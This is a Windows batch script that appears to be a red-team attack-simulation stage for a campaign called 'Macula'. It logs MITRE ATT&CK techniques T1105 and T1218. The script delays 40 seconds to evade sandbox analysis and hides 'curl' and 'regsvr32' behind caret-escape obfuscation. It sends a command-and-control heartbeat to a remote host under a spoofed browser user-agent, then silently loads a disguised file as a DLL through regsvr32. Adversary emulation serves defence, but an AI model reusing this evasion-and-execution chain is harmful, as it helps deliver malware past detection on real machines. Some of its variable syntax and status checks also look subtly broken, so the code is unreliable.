@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET pjmgh=%APPDATA%\8023\f9d81095
SET zlxqc=Macula-Stage0-8023
SET yvfbk=https://10.0.0.49
SET lqtxs=https://10.0.0.49/stage/2/icon.png?8023-7
SET drwvl=BALAM-S2BO
SET mpqkg=7
SET hntjd=teams.txt
SET vfryb=8023

REM Log file path using PHR_ variable
SET khnlb=%APPDATA%\!mpqkg!\macula-simulations.log

REM Create log directory if it doesn't exist
IF NOT EXIST "%APPDATA%\!mpqkg!\" (
    mkdir "%APPDATA%\!mpqkg!\" >nul 2>nul
    echo [!DATE! !TIME!][DEBUG][!drwvl!]: create_log_dir=%APPDATA%\!mpqkg!>> "!khnlb!" 2>nul
)

REM Initial delay to evade sandbox analysis
echo [!DATE! !TIME!][DEBUG][!drwvl!]: delay_start=initial_40s>> "!khnlb!" 2>nul
timeout /t 40 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!drwvl!]: delay_end=initial_40s>> "!khnlb!" 2>nul

REM 1. FIXED C2 HEARTBEAT - TWO-STAGE VALIDATION WITH PROPER HTTP CHECK
echo [!DATE! !TIME!][DEBUG][!drwvl!]: heartbeat_start=!lqtxs!>> "!khnlb!" 2>nul

REM Light obfuscation for curl only
SET c1=c^
SET c2=u^
SET c3=r^
SET c4=l

REM Check if curl exists
where !c1!!c2!!c3!!c4! >nul 2>&1
IF NOT !ERRORLEVEL! EQU 0 (
    echo [!DATE! !TIME!][DEBUG][!drwvl!]: curl_not_found>> "!khnlb!" 2>nul
    SET hbres=0
    SET hberr=curl_not_available
    GOTO :heartbeat_ttp_log
)

REM Stage 1: Test network connectivity first
echo [!DATE! !TIME!][DEBUG][!drwvl!]: network_test_start>> "!khnlb!" 2>nul
ping -n 2 8.8.8.8 >nul 2>&1
IF NOT !ERRORLEVEL! EQU 0 (
    echo [!DATE! !TIME!][DEBUG][!drwvl!]: network_test_failed>> "!khnlb!" 2>nul
    SET hbres=0
    SET hberr=no_network
    GOTO :heartbeat_ttp_log
)

REM Stage 2: Execute curl with proper flags and HTTP validation
echo [!DATE! !TIME!][DEBUG][!drwvl!]: curl_exec_start>> "!khnlb!" 2>nul

REM Build curl command with minimal obfuscation to avoid breaking URL
SET kf=-k
SET sf=-s
SET of=-o
SET nf=nul
SET wf=-w
SET h1=-H
SET h2="User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0"

REM Execute curl and capture HTTP status code
!c1!!c2!!c3!!c4% !kf% !sf% !of% !nf% !wf% "%%{http_code}" !h1% !h2% "!lqtxs!" 2>nul
SET http_status=!ERRORLEVEL!

REM Validate actual HTTP response (status codes 2xx or 3xx indicate success)
IF !http_status! GEQ 200 IF !http_status! LSS 400 (
    echo [!DATE! !TIME!][DEBUG][!drwvl!]: heartbeat_success=status_!http_status!>> "!khnlb!" 2>nul
    SET hbres=1
    SET hberr=
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!drwvl!]: heartbeat_failed=http_!http_status!>> "!khnlb!" 2>nul
    SET hbres=0
    SET hberr=http_!http_status!
)

:heartbeat_ttp_log
REM TTP logging for T1105 - Ingress Tool Transfer
SET log_date=!DATE:/=-!
SET log_time=!TIME: =0!
IF "!log_time:~1,1!"==":" SET log_time=0!log_time!
SET log_timestamp=!log_date:~-4!-!log_date:~3,2!-!log_date:~0,2! !log_time!.000
SET ttp_line=[!log_timestamp!][!drwvl!]: !mpqkg!-!vfryb!-T1105|Ingress Tool Transfer=!hbres!:!hberr!
echo !ttp_line!>> "!khnlb!" 2>nul || echo [!DATE! !TIME!][DEBUG][!drwvl!]: ttp_log_failed>> nul 2>nul

REM Random delay between operations
SET /A rdelay=!RANDOM! %% 15 + 10
echo [!DATE! !TIME!][DEBUG][!drwvl!]: delay_start=random_!rdelay!s>> "!khnlb!" 2>nul
timeout /t !rdelay! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!drwvl!]: delay_end=random_!rdelay!s>> "!khnlb!" 2>nul

REM 2. Change to output directory
echo [!DATE! !TIME!][DEBUG][!drwvl!]: chdir_start=!pjmgh!>> "!khnlb!" 2>nul
cd /d "!pjmgh!" >nul 2>nul
SET rc2=!ERRORLEVEL!

IF !rc2! EQU 0 (
    echo [!DATE! !TIME!][DEBUG][!drwvl!]: chdir_success=!pjmgh!>> "!khnlb!" 2>nul
    SET cdres=1
    SET cderr=
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!drwvl!]: chdir_failed=error_!rc2!>> "!khnlb!" 2>nul
    SET cdres=0
    SET cderr=path_not_found
)

REM Short delay before execution
echo [!DATE! !TIME!][DEBUG][!drwvl!]: delay_start=pre_exec_6s>> "!khnlb!" 2>nul
ping -n 6 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!drwvl!]: delay_end=pre_exec_6s>> "!khnlb!" 2>nul

REM 3. Execute DLL with obfuscated Regsvr32
echo [!DATE! !TIME!][DEBUG][!drwvl!]: dll_load_start=!hntjd!>> "!khnlb!" 2>nul

REM Obfuscate regsvr32 with caret escapes
SET w1=%^
SET w2=S^
SET w3=y^
SET w4=s^
SET w5=t^
SET w6=e^
SET w7=m^
SET w8=R^
SET w9=o^
SET w10=o^
SET w11=t^
SET w12=%^
SET w13=\^
SET w14=S^
SET w15=y^
SET w16=s^
SET w17=t^
SET w18=e^
SET w19=m^
SET w20=3^
SET w21=2^
SET w22=\^
SET r1=R^
SET r2=e^
SET r3=g^
SET r4=s^
SET r5=v^
SET r6=r^
SET r7=3^
SET r8=2^
SET e1=.^
SET e2=e^
SET e3=x^
SET e4=e
SET s1=/^
SET s2=s

REM Execute: %SystemRoot%\System32\Regsvr32.exe /s "DLL_PATH"
!w1!!w2!!w3!!w4!!w5!!w6!!w7!!w8!!w9!!w10!!w11!!w12!!w13!!w14!!w15!!w16!!w17!!w18!!w19!!w20!!w21!!w22!!r1!!r2!!r3!!r4!!r5!!r6!!r7!!r8!!e1!!e2!!e3!!e4% !s1!!s2% "!hntjd!"
SET rc3=!ERRORLEVEL!

IF !rc3! EQU 0 (
    echo [!DATE! !TIME!][DEBUG][!drwvl!]: dll_load_success=!hntjd!>> "!khnlb!" 2>nul
    SET dlres=1
    SET dlerr=
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!drwvl!]: dll_load_failed=error_!rc3!>> "!khnlb!" 2>nul
    SET dlres=0
    SET dlerr=regsvr32_failed
)

REM Final delay before exit
echo [!DATE! !TIME!][DEBUG][!drwvl!]: delay_start=final_12s>> "!khnlb!" 2>nul
CHOICE /C Y /N /D Y /T 12 >nul
echo [!DATE! !TIME!][DEBUG][!drwvl!]: delay_end=final_12s>> "!khnlb!" 2>nul

REM TTP Logging for T1218 - Signed Binary Proxy Execution
SET ttp_result=!dlres!
SET ttp_error=!dlerr!
SET log_date=!DATE:/=-!
SET log_time=!TIME: =0!
IF "!log_time:~1,1!"==":" SET log_time=0!log_time!
SET log_timestamp=!log_date:~-4!-!log_date:~3,2!-!log_date:~0,2! !log_time!.000
SET ttp_line=[!log_timestamp!][!drwvl!]: !mpqkg!-!vfryb!-T1218|Signed Binary Proxy Execution=!ttp_result!:!ttp_error!
echo !ttp_line!>> "!khnlb!" 2>nul || echo [!DATE! !TIME!][DEBUG][!drwvl!]: ttp_log_failed>> nul 2>nul

echo [!DATE! !TIME!][DEBUG][!drwvl!]: script_complete>> "!khnlb!" 2>nul
ENDLOCAL